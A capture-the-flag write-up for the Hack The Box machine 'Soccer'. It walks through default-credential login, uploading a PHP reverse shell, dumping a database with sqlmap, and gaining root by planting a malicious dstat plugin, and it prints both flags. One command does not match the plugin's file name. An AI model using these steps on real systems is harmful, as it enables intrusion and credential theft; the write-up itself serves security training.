---
title: "Soccer from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Soccer from HTB
`nmap`gave this:
```bash
22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp    open     http            nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp  open     xmltec-xmlmail?
```
add this to `/etc/hosts`:
```
10.10.11.194 soccer.htb
```
Then access the site and perform `directory search`with `ffuf or gobuster`and you will discover
```
soccer.htb/tiny
```
Directory and there is an login page.  Name is `Tiny File Manager`Search that and in `Github`repository you will find  https://github.com/prasathmani/tinyfilemanager
where
```
Default username/password: admin/admin@123 and user/12345
```
Try it. And you will login after using `admin admin@123`
Find `/tiny> /uploads`
You can upload `reverse-shell-php.php`and then click uploaded file `to execute it`.
URL should look somewhat like this: `http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&view=reverse.php`
After that you will get connection `on netcat`
```bash
nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.194] 50044
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 14:12:31 up 13 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@soccer:/$
```
You need to use `list`in this directory
```bash
ls -la /etc/nginx/sites-enabled/
total 8
drwxr-xr-x 2 root root 4096 Dec  1  2022 .
drwxr-xr-x 8 root root 4096 Nov 17  2022 ..
lrwxrwxrwx 1 root root   34 Nov 17  2022 default -> /etc/nginx/sites-available/default
lrwxrwxrwx 1 root root   41 Nov 17  2022 soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
```
There it is you found an needed `subdomain`which is `soc-player.soccer.htb`add it to `/etc/hosts`:
```
10.10.11.194 soc-player.soccer.htb
```
Access that subdomain. Then `signup`and perform `sql injection`with `sqlmap`:
```
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 -- level 5 --risk 3 --batch
```
After minutes you will get `database: soccer_db` read it:
```
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch
```
And you will get name and password:
player ------- PlayerOftheMatch2022
Connect to `ssh`with that.
***
User Flag is: 0a9918ca7ce3703124ef1338bf6c2696
***
`sudo -l`gave nothing.
Looking for files with the `SUID` bit set, we stumble upon the `/usr/bin/doas binary`, which is an alternative to the more commonly used `sudo` binary:
```bash
find / -type f -perm -4000 2>/dev/null
```
This will list this:
```
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
```
Then read
```bash
cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```
This means we can use `dstat`with root privileges.
Reading manual for `dstat`we find this:
```
FILES
       Paths that may contain external dstat_*.py plugins:

           ~/.dstat/
           (path of binary)/plugins/
           /usr/share/dstat/
           /usr/local/share/dstat/
```
So we must create an `dstat_shell.py`in directory where we can.
I created it in `/usr/local/share/dstat`with codes:
```
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_shell.py
```
Then execute it like this:
```
/usr/local/bin/doas /usr/bin/dstat --pwn
```
It will spawn `root shell`.
***
Root Flag is: df13042d98034989daa88dc8d5586ec4
***
![](/assets/images/Screenshot from 2024-08-13 18-54-03.png)
